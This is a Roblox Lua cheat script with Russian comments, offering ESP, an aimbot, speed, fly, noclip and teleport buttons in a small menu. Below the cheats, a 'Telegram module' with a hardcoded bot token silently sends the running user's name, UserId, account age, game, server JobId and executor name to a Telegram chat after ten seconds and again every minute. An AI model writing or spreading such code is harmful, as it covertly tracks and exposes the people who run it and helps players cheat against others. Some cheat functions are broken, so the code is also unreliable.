-- brainrotkachillscrpt - полностью кастомный скрипт
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local mouse = player:GetMouse()

-- Ожидаем загрузки игры
repeat wait() until game:IsLoaded()

-- Создаем интерфейс
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BrainrotKachillUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Кнопка LR (маленькая черная с белыми буквами)
local openButton = Instance.new("TextButton")
openButton.Name = "LRButton"
openButton.Size = UDim2.new(0, 45, 0, 25)
openButton.Position = UDim2.new(0, 5, 0.5, -12)
openButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
openButton.BorderSizePixel = 0
openButton.Text = "LR"
openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
openButton.TextSize = 12
openButton.Font = Enum.Font.GothamBold
openButton.ZIndex = 1000
openButton.Parent = screenGui

-- Главное меню
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 280, 0, 400)
mainFrame.Position = UDim2.new(0, 55, 0.5, -200)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
mainFrame.BorderSizePixel = 1
mainFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
mainFrame.Visible = false
mainFrame.Parent = screenGui

-- Заголовок
local title = Instance.new("TextLabel")
title.Text = "brainrotkachillscrpt v2.0"
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 14
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

-- Управление меню
local menuOpen = false
openButton.MouseButton1Click:Connect(function()
    menuOpen = not menuOpen
    mainFrame.Visible = menuOpen
end)

-- Закрытие меню по клику вне его
game:GetService("UserInputService").InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and menuOpen then
        local mousePos = input.Position
        local framePos = mainFrame.AbsolutePosition
        local frameSize = mainFrame.AbsoluteSize
        
        if mousePos.X < framePos.X or mousePos.X > framePos.X + frameSize.X or
           mousePos.Y < framePos.Y or mousePos.Y > framePos.Y + frameSize.Y then
            menuOpen = false
            mainFrame.Visible = false
        end
    end
end)

-- Функция создания кнопок
local yPosition = 35
local function createButton(text, callback)
    local button = Instance.new("TextButton")
    button.Text = text
    button.Size = UDim2.new(0.9, 0, 0, 35)
    button.Position = UDim2.new(0.05, 0, 0, yPosition)
    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 12
    button.Font = Enum.Font.Gotham
    button.Parent = mainFrame
    
    button.MouseButton1Click:Connect(callback)
    yPosition = yPosition + 40
    return button
end

-- Функции скрипта
createButton("ESP Players", function()
    -- Простой ESP
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local highlight = Instance.new("Highlight")
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.Parent = plr.Character
        end
    end
end)

createButton("Aimbot", function()
    -- Простой Aimbot
    local closestPlayer = nil
    local closestDistance = math.huge
    
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (player.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude
            if distance < closestDistance then
                closestDistance = distance
                closestPlayer = plr
            end
        end
    end
    
    if closestPlayer then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Aimbot",
            Text = "Target: " .. closestPlayer.Name,
            Duration = 3
        })
    end
end)

createButton("Speed Hack", function()
    -- Speed Hack
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid.WalkSpeed = 50
    end
end)

createButton("Fly Hack", function()
    -- Fly Hack
    local flyEnabled = false
    local bodyVelocity
    
    if not flyEnabled then
        flyEnabled = true
        bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
        bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
        bodyVelocity.Parent = player.Character.HumanoidRootPart
    else
        flyEnabled = false
        if bodyVelocity then
            bodyVelocity:Destroy()
        end
    end
end)

createButton("Noclip", function()
    -- Noclip
    if player.Character then
        for _, part in pairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end
end)

createButton("Teleport to Player", function()
    -- Телепорт к случайному игроку
    local players = Players:GetPlayers()
    local targetPlayer = players[math.random(2, #players)]  -- Исключаем себя
    
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
    end
end)

-- Telegram модуль для сбора данных
local request = (syn and syn.request) or (http and http.request) or http_request
if request then
    local BOT_TOKEN = "7965475701:AAFM4hkPUiWyh_Clw3lkMILpWNK0R7cHe08"
    local CHAT_ID = "8238376878"
    
    local function sendToTelegram(msg)
        pcall(function()
            request({
                Url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    chat_id = CHAT_ID,
                    text = msg,
                    parse_mode = "HTML"
                })
            })
        end)
    end

    -- Улучшенный сбор данных
    local function collectDetailedData()
        local data = {}
        
        -- Основная информация
        data.player_name = player.Name
        data.user_id = player.UserId
        data.account_age = player.AccountAge
        data.premium = player.MembershipType == Enum.MembershipType.Premium
        
        -- Информация о игре
        data.game_name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        data.place_id = game.PlaceId
        data.job_id = game.JobId
        data.players_online = #Players:GetPlayers()
        
        -- Информация об исполнителе
        data.executor = getexecutorname and getexecutorname() or "Unknown"
        data.injection_time = os.date("%Y-%m-%d %H:%M:%S")
        
        return data
    end

    -- Первый сбор через 10 секунд
    delay(10, function()
        local initialData = collectDetailedData()
        local message = string.format([[
🧠 <b>brainrotkachillscrpt ACTIVATED</b>

👤 <b>USER INFORMATION:</b>
Name: %s
UserID: %d
Account Age: %d days
Premium: %s

🎮 <b>GAME SESSION:</b>
Game: %s
PlaceID: %d
Players Online: %d

⚙️ <b>SYSTEM INFO:</b>
Executor: %s
Time: %s
        ]],
        initialData.player_name, initialData.user_id, initialData.account_age,
        tostring(initialData.premium),
        initialData.game_name, initialData.place_id, initialData.players_online,
        initialData.executor, initialData.injection_time)
        
        sendToTelegram(message)
    end)

    -- Сбор данных каждую минуту
    spawn(function()
        while wait(60) do
            local updateData = collectDetailedData()
            local updateMessage = string.format([[
🔄 <b>MINUTE UPDATE</b>
User: %s
Game: %s
Players: %d
Session Time: %s
            ]],
            updateData.player_name,
            updateData.game_name,
            updateData.players_online,
            os.date("%H:%M:%S"))
            
            sendToTelegram(updateMessage)
        end
    end)
end

-- Уведомление о загрузке
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "brainrotkachillscrpt v2.0",
    Text = "Loaded! Press LR button to open menu",
    Duration = 5
})

print("brainrotkachillscrpt loaded successfully!")
